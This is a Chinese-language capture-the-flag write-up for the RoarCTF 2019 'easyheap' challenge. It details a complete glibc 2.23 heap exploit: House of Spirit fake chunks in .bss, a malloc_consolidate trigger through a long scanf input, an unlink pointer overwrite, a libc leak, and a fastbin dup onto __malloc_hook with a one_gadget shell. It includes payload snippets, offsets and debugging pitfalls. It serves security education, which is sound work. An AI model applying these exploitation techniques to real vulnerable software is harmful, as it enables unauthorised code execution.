# [RoarCTF 2019]easyheap Writeup

## 一、题目信息

- 保护：**Full RELRO / Canary / NX / No PIE (0x400000)**，64 位，stripped
- 远程环境：`Ubuntu 16.04`，libc = **2.23**（`main_arena+88 = 0x3c4b78`，`__malloc_hook = 0x3c4b10`）
- 本地复现用 `libc-2.23.so`（2.23-0ubuntu11.3）+ `ld-2.23.so`，patchelf 指定解释器与 rpath

## 二、程序结构与全局变量

```
主菜单: 1.add  2.dele  3.show  4.exit   隐藏: 输入 666 -> 二菜单(build/free?)
```

| 地址 | 含义 |
|---|---|
| 0x602010 | 二菜单剩余次数（初值 3） |
| 0x602018 | 主菜单剩余次数（初值 16） |
| **0x602060** | 启动 username 读入（0x20 字节） |
| **0x602088** | 主菜单 add 的 chunk 指针（**只有一个槽位**） |
| **0x602090** | show 的 magic（启动时从 `/dev/random` 读 8 字节） |
| **0x602098** | 二菜单 build 的 chunk 指针 |
| **0x6020a0** | 启动 info 读入（0x20 字节） |

关键反汇编：

- `add`（0x400dc0）：`read(0,rsp,8)` → `strtol` → `size>0x80` 拒绝 → `malloc(size)` → **存 0x602088** → `read(0,ptr,size)`。**不读 index，永远写同一槽位**。
- `delete`（0x400ab0）：`free([0x602088])`，**不清零** → UAF / double free。
- `show`（0x400c40）：`puts([0x602088])`，但入口处 `if ([0x602090] == 0xdeadbeefdeadbeef)` 才调用；且 show 内部最后 `close(1); close(2)`。
- 二菜单 `build`（0x400ff0）：`calloc(0xa0,1)` → 存 0x602098 → `read(0,ptr,0xa0)`；`free`（0x400fe0）：`free([0x602098])`，不清零。

## 三、漏洞点

1. **单指针 + free 不清零** → UAF / double free。
2. **show 被 `/dev/random` 的随机 magic 门控** → 无直接泄漏通道。
3. No PIE 下 `.bss` 地址固定 → 适合当 unlink 目标。

## 四、利用思路

单指针无法在 fastbin 里同时留两个块，所以**不能直接 fastbin dup 来泄漏**。破局点是：

### 1. 用启动的 username/info 在 `.bss` 伪造块（House of Spirit）

```
username 写 0x602060..0x60207f，末尾 qword 落 0x602078 -> 写成 0x41
info     写 0x6020a0..0x6020bf，末尾 qword 落 0x6020b8 -> 写成 0x20e21
```

### 2. 整理 fastbin + 预埋假块链

```
add(0x38)/dele, add(0x48)/dele, add(0x28)/dele, add(0x18)/dele
add(0x68, b'\0'*0x30 + p64(0)+p64(0x21) + b'\0'*0x10 + p64(0x20)+p64(0x101))
dele()
add(0x80) ; add(0x28) ; dele
sendline('1'*0x400)          # 触发 scanf 内部 malloc -> malloc_consolidate 合并 fastbin
```

> **关键（易误解）**：`sendline('1'*0x400)` **不是**“把输入流打乱/对齐”，它**真的改变了堆**：
> `scanf("%d")` 解析数字时用栈上 work_buffer（glibc 2.23 约 **1024B**）；数字串超过它就会**内部 `malloc` 一块临时缓冲**继续收，
> 该请求大于 fastbin 上限，`_int_malloc` 走大块路径前会调用 **`malloc_consolidate()`**，
> 把所有 fastbin 搬入 unsorted 并**相邻合并**：
> `0x40+0x50+0x30+0x20+0x70 = 0x150`，于是后面 `0x90` 块的 `PREV_INUSE` 被清（`0x91 → 0x90`）。
> **这正是后续 unlink 能成立的前提。**
> 长度必须超过栈缓冲阈值：实测 `<=1023` 不触发（unlink 崩），`>=1024` 触发；且长度非单调（1026 崩 / 1100 成），
> 取决于内部临时块尺寸落在哪个 bin。`test eax,eax` 只是 scanf 返回后的检查，本身不动堆。

### 3. unlink 攻击劫持二菜单指针

```
payload  = 2*p64(0) + p64(0x602098-0x18) + p64(0x602098-0x10)
payload  = payload.ljust(0x80, b'\0') + p64(0x80) + p64(0x90)
gift(1, payload); dele(); gift(2)
```

unlink 执行 `FD->bk = BK; BK->fd = FD`，令 `0x602098`（二菜单指针）被改写成 **0x602080**。

### 4. 劫持主 add 指针 + 解开 show 的 magic

```
add(0x38, p64(0) + p64(0x602080) + p64(0xdeadbeefdeadbeef))
dele()
add(0x68, b'A'*0x10)
```

写入后：`0x602088 = 0x602080`、`0x602090 = 0xdeadbeefdeadbeef` → show 可用。

### 5. 泄漏 libc

```
show()  -> 打印 0x68 块内容(前 16 字节 'A') + 相邻 unsorted 残留的 main_arena 指针
leak = u64(recvn(6).ljust(8,'\0'))
libc.address = leak - 0x3c4b78     # main_arena+88
```

> **坑**：地址字节可能含 `0x0a`，不能用 `recvuntil('\n')` 截断，必须**固定读 6 字节**。

### 6. fastbin dup 打 `__malloc_hook`

```
free(当前块) ; add(0x80)
add(0x18, p64(0)+p64(0x71)+p64(__malloc_hook-0x23))
add(0x68, b'\0'*0x68)
add(0x68, b'\0'*0x13 + p64(one_gadget))
free()   -> malloc 触发 __malloc_hook -> one_gadget -> shell
```

`__malloc_hook-0x23` 处有合法的 `0x7f` size 字节，是经典偏移。

> **坑**：`show` 内部 `close(1)/close(2)`，之后程序**没有任何输出**，所有后续菜单必须**盲发**（`sendline` 而不等提示符）。

## 五、关键偏移（libc 2.23-0ubuntu11.3）

| 符号 | 偏移 |
|---|---|
| main_arena+88（泄漏点） | 0x3c4b78 |
| `__malloc_hook` | 0x3c4b10 |
| `system` | 0x453a0 |
| one_gadget（本路径可用） | **0xf03a4** |

> one_gadget 候选 0x4527a / 0xf03a4 / 0xf1247 中，`__malloc_hook`（`call *rax`）触发路径下只有 **0xf03a4** 满足约束。

## 六、踩过的坑

1. **泄漏用 `recvuntil('\n')`** → 地址含 0x0a 被截断，算出垃圾 libc 基址。改 `recvn(6)`。
2. **show 之后一直等 `>>` 提示** → 卡死。实际 show 已 `close(1/2)`，必须盲发。
3. **libc 版本选错** → 本地 2.23-0ubuntu3 偏移 `0x3c3b78` 与远程不符；须用与 `0x3c4b78` 对齐的 2.23-0ubuntu11.3。
4. **one_gadget 选错** → 0x4527a/0xf1247 直接 SIGSEGV，只有 0xf03a4 成功。

## 七、运行

```bash
# 本地
python3 exp.py

# 远程（改 exp.py 里的 remote 地址）
python3 exp.py REMOTE
```

本地输出验证：

```
===PWNED===
flag{flag_test}
```

> 触发时会有一行 `free(): invalid pointer`（free 了 hook 附近指针），不影响拿 shell。
